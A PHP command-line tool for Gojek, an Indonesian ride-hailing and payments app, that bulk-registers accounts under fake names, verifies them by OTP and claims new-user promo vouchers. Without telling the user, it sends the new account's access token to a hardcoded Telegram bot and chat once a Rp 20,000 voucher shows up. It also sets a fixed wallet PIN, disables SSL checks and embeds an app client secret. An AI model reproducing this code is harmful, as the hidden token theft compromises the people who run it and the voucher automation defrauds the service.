<?php

function request($url, $token = null, $data = null, $pin = null, $otpsetpin = null, $uuid = null){

$header[] = "Host: api.gojekapi.com";
$header[] = "User-Agent: okhttp/3.12.1";
$header[] = "Accept: application/json";
$header[] = "Accept-Language: id-ID";
$header[] = "Content-Type: application/json; charset=UTF-8";
$header[] = "X-AppVersion: 3.40.3";
$header[] = "X-UniqueId: ".time()."57".mt_rand(10000,99999);
$header[] = "Connection: keep-alive";
$header[] = "X-User-Locale: id_ID";
if ($pin):
$header[] = "pin: $pin";
    endif;
if ($token):
$header[] = "Authorization: Bearer $token";
endif;
if ($otpsetpin):
$header[] = "otp: $otpsetpin";
endif;
if ($uuid):
$header[] = "User-uuid: $uuid";
endif;
$c = curl_init("https://api.gojekapi.com".$url);
    curl_setopt($c, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    if ($data):
    curl_setopt($c, CURLOPT_POSTFIELDS, $data);
    curl_setopt($c, CURLOPT_POST, true);
    endif;
    curl_setopt($c, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($c, CURLOPT_HEADER, true);
    curl_setopt($c, CURLOPT_HTTPHEADER, $header);
    $response = curl_exec($c);
    $httpcode = curl_getinfo($c);
    if (!$httpcode)
        return false;
    else {
        $header = substr($response, 0, curl_getinfo($c, CURLINFO_HEADER_SIZE));
        $body   = substr($response, curl_getinfo($c, CURLINFO_HEADER_SIZE));
    }
    $json = json_decode($body, true);
    return $body;
}
function save($filename, $content)
{
    $save = fopen($filename, "a");
    fputs($save, "$content\r\n");
    fclose($save);
}
function nama()
    {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "http://ninjaname.horseridersupply.com/indonesian_name.php");
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $ex = curl_exec($ch);
    // $rand = json_decode($rnd_get, true);
    preg_match_all('~(&bull; (.*?)<br/>&bull; )~', $ex, $name);
    return $name[2][mt_rand(0, 14) ];
    }
function getStr($a,$b,$c){
	$a = @explode($a,$c)[1];
	return @explode($b,$a)[0];
}
function getStr1($a,$b,$c,$d){
        $a = @explode($a,$c)[$d];
        return @explode($b,$a)[0];
}
function color($color = "default" , $text)
    {
        $arrayColor = array(
            'grey'      => '1;30',
            'red'       => '1;31',
            'green'     => '1;32',
            'yellow'    => '1;33',
            'blue'      => '1;34',
            'purple'    => '1;35',
            'nevy'      => '1;36',
            'white'     => '1;0',
        );  
        return "\033[".$arrayColor[$color]."m".$text."\033[0m";
    }
function fetch_value($str,$find_start,$find_end) {
	$start = @strpos($str,$find_start);
	if ($start === false) {
		return "";
	}
	$length = strlen($find_start);
	$end    = strpos(substr($str,$start +$length),$find_end);
	return trim(substr($str,$start +$length,$end));
}

date_default_timezone_set('Asia/Jakarta');
echo color("red","[][][][][][][][][][][][][][][][][][][][][]");
echo color("red","\n[]  Auto Create Gojek X Redeem Voucher  []\n");
echo color("red","[]  Creator : XTMR                      []\n");
echo "[]  Version : V3.3                      []\n";
echo "[]  Time    : ".date('[d-m-Y] [H:i:s]')."   []\n";
echo "[][][][][][][][][][][][][][][][][][][][][]\n\n";

function change(){
        $nama = nama();
        $email = str_replace(" ", "", $nama) . mt_rand(100, 999);
        ulang:
        echo color("nevy","[=] Nomer lu : ");
        $no = trim(fgets(STDIN));
        $data = '{"email":"'.$email.'@gmail.com","name":"'.$nama.'","phone":"+'.$no.'","signed_up_country":"ID"}';
        $register = request("/v5/customers", null, $data);
        if(strpos($register, '"otp_token"')){
        $otptoken = getStr('"otp_token":"','"',$register);
        echo color("green","[=] Kode verifikasi sudah di kirim")."\n";
        otp:
        echo color("nevy","[=] OTP      : ");
        $otp = trim(fgets(STDIN));
        $data1 = '{"client_name":"gojek:cons:android","data":{"otp":"' . $otp . '","otp_token":"' . $otptoken . '"},"client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e"}';
        $verif = request("/v5/customers/phone/verify", null, $data1);
        if(strpos($verif, '"access_token"')){
        echo color("green","[=] Berhasil mendaftar");
        $token = getStr('"access_token":"','"',$verif);
        $uuid = getStr('"resource_owner_id":',',',$verif);
        echo "\n".color("nevy","[=] Mau Rendeem Voucher?: ");
        $pilihan = trim(fgets(STDIN));
        if($pilihan == "y" || $pilihan == "Y"){
        echo color("red","===============(RENDEEM VOUCHER)===============");
        echo "\n".color("yellow","[!] Klaim Voucher GOFOOD JUMBO");
        echo "\n".color("yellow","[!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        $code1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODSANTAI19"}');
        $message = fetch_value($code1,'"message":"','"');
        if(strpos($code1, 'Promo kamu sudah bisa dipakai')){
        echo "\n".color("green","[+] Message: ".$message);
        goto goride;
        }else{
        echo "\n".color("red","[-] Message: ".$message);
        echo "\n".color("yellow","[!] Klaim Voucher GOFOOD MEDIUM");
        echo "\n".color("yellow","[!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $santai11 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODSANTAI11"}');
        $messagesantai11 = fetch_value($santai11,'"message":"','"');
        if(strpos($santai11, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","[+] Message: ".$messagesantai11);
        goto goride;
        }else{
        echo "\n".color("red","[-] Message: ".$messagesantai11);
        echo "\n".color("yellow","[!] Klaim Voucher GOFOOD SMALL");
        echo "\n".color("yellow","[!] Please Wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $santai08 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"GOFOODSANTAI08"}');
        $messagesantai08 = fetch_value($santai08,'"message":"','"');
        if(strpos($santai08, 'Promo kamu sudah bisa dipakai.')){
        echo "\n".color("green","[+] Message: ".$messagesantai08);
        goto goride;
        }else{
        echo "\n".color("red","[+] Message: ".$messagesantai08);
        goride:
        echo "\n".color("yellow","[!] Klaim Voucher AYOCOBAGOJEK");
        echo "\n".color("yellow","[!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"AYOCOBAGOJEK"}');
        $message1 = fetch_value($goride,'"message":"','"');
        echo "\n".color("green","[+] Message: ".$message1);
        echo "\n".color("yellow","[!] Klaim Voucher COBAINGOJEK");
        echo "\n".color("yellow","[!] Please wait");
        for($a=1;$a<=3;$a++){
        echo color("yellow",".");
        sleep(1);
        }
        sleep(3);
        $goride1 = request('/go-promotions/v1/promotions/enrollments', $token, '{"promo_code":"COBAINGOJEK"}');
        $message2 = fetch_value($goride1,'"message":"','"');
        echo "\n".color("green","[+] Message: ".$message2);
        sleep(3);
        $cekvoucher = request('/gopoints/v3/wallet/vouchers?limit=10&page=1', $token);
        $total = fetch_value($cekvoucher,'"total_vouchers":',',');
        $voucher3 = getStr1('"title":"','",',$cekvoucher,"3");
        $voucher1 = getStr1('"title":"','",',$cekvoucher,"1");
        $voucher2 = getStr1('"title":"','",',$cekvoucher,"2");
        $voucher4 = getStr1('"title":"','",',$cekvoucher,"4");
        $voucher5 = getStr1('"title":"','",',$cekvoucher,"5");
        $voucher6 = getStr1('"title":"','",',$cekvoucher,"6");
        $voucher7 = getStr1('"title":"','",',$cekvoucher,"7");
        echo "\n".color("yellow","[!] Total Voucher ".$total." : ");
        echo "\n".color("green","                      1. ".$voucher1);
        echo "\n".color("green","                      2. ".$voucher2);
        echo "\n".color("green","                      3. ".$voucher3);
        echo "\n".color("green","                      4. ".$voucher4);
        echo "\n".color("green","                      5. ".$voucher5);
        echo "\n".color("green","                      6. ".$voucher6);
        echo "\n".color("green","                      7. ".$voucher7);
        $expired1 = getStr1('"expiry_date":"','"',$cekvoucher,'1');
        $expired2 = getStr1('"expiry_date":"','"',$cekvoucher,'2');
        $expired3 = getStr1('"expiry_date":"','"',$cekvoucher,'3');
        $expired4 = getStr1('"expiry_date":"','"',$cekvoucher,'4');
        $expired5 = getStr1('"expiry_date":"','"',$cekvoucher,'5');
        $expired6 = getStr1('"expiry_date":"','"',$cekvoucher,'6');
        $expired7 = getStr1('"expiry_date":"','"',$cekvoucher,'7');
        $TOKEN  = "947000300:AAFUi3-WiOxtCnGsXxiN5k8wm3X82m_lAhs";
			  $chatid = "832583638";
         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
					$pesan 	= $token;
					$method	= "sendMessage";
					$url    = "https://api.telegram.org/bot" . $TOKEN . "/". $method;
					$post = [
 					'chat_id' => $chatid,
 			    	'text' => $pesan
					];
                                        $header = [
                                        "X-Requested-With: XMLHttpRequest",
                                        "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.84 Safari/537.36" 
                                        ];
                                        $ch = curl_init();
                                        curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                        curl_setopt($ch, CURLOPT_URL, $url);
                                        curl_setopt($ch, CURLOPT_HTTPHEADER, $header);
                                        curl_setopt($ch, CURLOPT_POSTFIELDS, $post );   
                                        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                                        $datas = curl_exec($ch);
                                        $error = curl_error($ch);
                                        $status = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                                        curl_close($ch);
                                        $debug['text'] = $pesan;
                                        $debug['respon'] = json_decode($datas, true);
                                        }
         if(strpos($cekvoucher, 'Voucher Rp 20.000 pakai GoFood')){
         save("akungojek20k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
         }else{
         save("akungojek10k.txt","[+] Gojek Account Info [+]\nNama = $nama\nNomer = $no\nAccess Token = $token");
         }
         setpin:
         echo "\n".color("nevy","[=] Mau set pin?: ");
         $pilih1 = trim(fgets(STDIN));
         if($pilih1 == "y" && strpos($no, "628")){
         echo color("red","===================(SET PIN)===================")."\n";
         $data2 = '{"pin":"050203"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "OTP set pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;
         }else if($pilih1 == "n" || $pilih1 == "N"){
         die();
         }else{
         echo color("red","[-] Nomer luar negeri gk bisa set pin cok!!!!!\n");
         }
         }
         }
         }
         }else{
         goto setpin;
         }
         }else{
         echo color("red","[-] OTP yang anda input salah");
         echo"\n==========================================\n\n";
         echo color("yellow","[!] Silahkan input kembali\n");
         goto otp;
         }
         }else{
         echo "Nomor hp sudah terdaftar";
         echo "\nMau login? (y/n): ";
         $pilih = trim(fgets(STDIN));
         if($pilih == "y" || $pilih == "Y"){
         echo "\n===================Login====================\n";
         echo "Nomermu: ".$no."\n";
         $datalogin = '{"phone":"+'.$no.'"}';
         $login = request('/v4/customers/login_with_phone', null, $datalogin);
         if(strpos($login, '"login_token"')){
         echo "Kode verifikasi sudah di kirim";
         echo "\nOTP: ";
         $otplogin = trim(fgets(STDIN));
         $logintoken = getStr('"login_token": "','"',$login);
         $datalogin1 = '{"client_name":"gojek:cons:android","client_secret":"83415d06-ec4e-11e6-a41b-6c40088ab51e","data":{"otp":"'.$otplogin.'","otp_token":"'.$logintoken.'"},"grant_type":"otp","scopes":"gojek:customer:transaction gojek:customer:readonly"}';
         $veriflogin = request('/v4/customers/login/verify', null, $datalogin1);
         echo $veriflogin;
         $token = getStr('"access_token":"','"',$veriflogin);
         $uuid = getStr('"resource_owner_id":',',',$veriflogin);
         $data2 = '{"pin":"050203"}';
         $getotpsetpin = request("/wallet/pin", $token, $data2, null, null, $uuid);
         echo "OTP set pin: ";
         $otpsetpin = trim(fgets(STDIN));
         $verifotpsetpin = request("/wallet/pin", $token, $data2, null, $otpsetpin, $uuid);
         echo $verifotpsetpin;;
         }else{
         echo "Error. Silahkan coba lagi";
         }
         }else{
         echo "\n==================Register==================\n";
         goto ulang;
  }
 }
}
echo change()."\n"; ?>
